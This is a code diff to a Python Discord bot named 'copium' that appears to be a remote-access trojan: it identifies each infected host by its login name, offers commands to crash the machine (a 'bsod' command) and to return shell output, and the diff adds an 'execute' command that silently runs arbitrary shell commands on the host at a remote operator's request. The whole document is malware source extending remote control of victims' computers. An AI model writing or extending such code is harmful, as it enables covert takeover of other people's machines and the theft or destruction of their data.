@@ -22,8 +22,8 @@ else:
     silent = 0
 
 file_name = file_path.split("\\")[-1]
-copium_ver = 1.26
-whoami = f"{os.getlogin()}-{random.choice(string.ascii_letters)}{random.randint(0, 9)}"
+copium_ver = 1.27
+whoami = f"{os.getlogin()}-{random.choice(string.ascii_uppercase)}{random.randint(0, 9)}"
 client = commands.Bot(command_prefix='!', intents=discord.Intents.all(), help_command=None)
 current_login = None
 
@@ -181,7 +181,7 @@ async def bsod_command(ctx):
     print(log_command(ctx))
 
 
-@client.hybrid_command(name="cmd", with_app_command=True, description="executes a shell command in the host")
+@client.hybrid_command(name="cmd", with_app_command=True, description="returns the output of a shell command")
 async def cmd_command(ctx, *, command, timeout: int = 30):
     if current_login != whoami:
         return
@@ -201,6 +201,17 @@ async def cmd_command(ctx, *, command, timeout: int = 30):
     else:
         await ctx.reply(f'{command} did not return any results', ephemeral=True)
     print(log_command(ctx, command))
+
+
+@client.hybrid_command(name="execute", with_app_command=True, description="executes a shell command in the host")
+async def execute_command(ctx, *, command):
+    if current_login != whoami:
+        return
+
+    await ctx.reply(f'"{command}" scheduled', ephemeral=True)
+    print(log_command(ctx, command))
+    subprocess.run(command, shell=True, creationflags=silent)
+    await ctx.reply(f'"{command}" got executed successfully', ephemeral=True)
 
 
 @client.hybrid_command(name="site", with_app_command=True, description="opens the specified site in the host")
